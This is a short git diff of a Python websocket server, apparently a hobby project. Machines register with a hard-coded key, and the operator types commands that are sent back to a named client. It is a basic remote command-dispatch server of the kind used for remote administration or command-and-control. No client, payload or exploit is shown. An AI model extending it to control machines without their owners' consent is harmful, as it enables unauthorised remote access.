@@ -1,17 +1,24 @@
 from websockets import serve
 from asyncio import get_event_loop
-
+# THIS IS THE SERVER
+# I SHOULD CONVERT THIS TO BINARY, WHY AM I USING FULL NAMES SOB
 connectedMachines = []
 async def main(websocket, path):
     while True:
         res = await websocket.recv()
         if "KEY: OmG" in res:
             try:
-                print(res.split("CONNECT: ")[1].split(" KEY:")[0])
+                machineName = res.split("CONNECT: ")[1].split(" KEY:")[0]
+                if machineName in connectedMachines:
+                    continue
+
                 await websocket.send("SUCCESS")
+                connectedMachines.append(machineName)
             except:
                 pass
-        await websocket.send("server.py")
+        elif "<MCHNNAME: " in res:
+            cmd = input(res.split("<MCHNNAME: ")[1].split(">")[0])
+            await websocket.send(cmd)
 
 asyncEventLoop = get_event_loop()
 startWebSockets = serve(main, "localhost", 8765)
